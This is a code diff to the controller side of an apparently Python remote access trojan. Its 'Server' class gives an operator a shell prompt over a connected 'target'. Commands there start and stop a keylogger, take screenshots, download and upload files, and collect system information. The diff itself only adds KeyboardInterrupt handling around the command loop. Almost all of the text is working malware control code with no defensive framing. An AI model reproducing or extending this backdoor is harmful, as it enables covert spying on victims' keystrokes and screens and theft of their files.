@@ -123,84 +123,92 @@ class Server:
         print("[+] connected to: " + str(r_host))
         print("\n[*] Type: info\n")
         while True:
-            command = input("[$] shell~# ")
-            if command == '':
-                continue
+            try:
+                command = input("[$] shell~# ")
+                if command == '':
+                    continue
 
-            elif command.lower() == 'info':
-                print("""
+                elif command.lower() == 'info':
+                    print("""
+    
+                        [*] Shell commands:
+    
+    
+                        • keyscan_start - Start the keylogger.
+    
+                        • keyscan_stop - Stop the keylogger and save the log to a file in the script's directory.
+                        
+                        • screenshot - Take a screenshot and save the img in the script's directory.
+    
+                        • download <file_name> - Download a file from the target.
+    
+                        • upload <file_name> - Upload a file to the target.
+    
+                        • target info - Get target detailed info.
+    
+                        • clear or cls - Clear the screen.
+    
+    
+                        • quit - Quit the shell and close the connection.
+    
+    
+                        Note: Replace <file_name> with the name of the file you want to download or upload.
+    
+                        """)
+                    continue
 
-                    [*] Shell commands:
+                elif command.startswith('keyscan_stop'):  # just to be safe
+                    continue
 
+                self.send_data_as_json(command)
 
-                    • keyscan_start - Start the keylogger.
+                if command.lower() == 'quit':
+                    self.dump_log_file()
+                    self.target_socket.close()
+                    exit(0)
 
-                    • keyscan_stop - Stop the keylogger and save the log to a file in the script's directory.
-                    
-                    • screenshot - Take a screenshot and save the img in the script's directory.
+                elif command.startswith('cd '):
+                    continue
 
-                    • download <file_name> - Download a file from the target.
+                elif command in ['clear', 'cls']:
+                    clear_command = 'clear' if command == 'clear' else 'cls'
+                    os.system(clear_command)
+                    continue
 
-                    • upload <file_name> - Upload a file to the target.
+                elif command.startswith('keyscan start'):
+                    print("[+] Keylogger started.")
+                    print("[!] ctrl+C to save & stop")
+                    self.key_logger()
+                    print("[!] Log saved! ")
+                    time.sleep(1.25)
+                    self.send_data_as_json('keyscan_stop')
+                    continue
 
-                    • target info - Get target detailed info.
+                elif command.startswith('download'):
+                    self.download_file(command[9:])
+                    continue
+                elif command.startswith('upload'):
+                    self.upload_file(command[7:])
+                    continue
 
-                    • clear or cls - Clear the screen.
+                elif command.startswith('screenshot'):
+                    self.screen_shot()
+                    continue
 
+                elif command.startswith('target info'):
+                    self.target_sys_info()
+                    continue
 
-                    • quit - Quit the shell and close the connection.
-
-
-                    Note: Replace <file_name> with the name of the file you want to download or upload.
-
-                    """)
-                continue
-
-            elif command.startswith('keyscan_stop'):  # just to be safe
-                continue
-
-            self.send_data_as_json(command)
-
-            if command.lower() == 'quit':
-                self.dump_log_file()
-                self.target_socket.close()
-                exit(0)
-
-            elif command.startswith('cd '):
-                continue
-
-            elif command in ['clear', 'cls']:
-                clear_command = 'clear' if command == 'clear' else 'cls'
-                os.system(clear_command)
-                continue
-
-            elif command.startswith('keyscan start'):
-                print("[+] Keylogger started.")
-                print("[!] ctrl+C to save & stop")
-                self.key_logger()
-                print("[!] Log saved! ")
-                time.sleep(1.25)
-                self.send_data_as_json('keyscan_stop')
-                continue
-
-            elif command.startswith('download'):
-                self.download_file(command[9:])
-                continue
-            elif command.startswith('upload'):
-                self.upload_file(command[7:])
-                continue
-
-            elif command.startswith('screenshot'):
-                self.screen_shot()
-                continue
-
-            elif command.startswith('target info'):
-                self.target_sys_info()
-                continue
-
-            else:
-                result = self.receive_data_as_json()
-                print(result)
+                else:
+                    result = self.receive_data_as_json()
+                    print(result)
+            except KeyboardInterrupt:
+                print("[WARNING] #~ KeyboardInterrupt ~# \n</> Press [ Enter ] to stay. \n</> Type [ Quit ] to leave.")
+                KeyboardInterrupt_loop = input("")
+                if KeyboardInterrupt_loop.lower() == 'quit':
+                    break
+                else:
+                    continue
 
 
 if __name__ == "__main__":
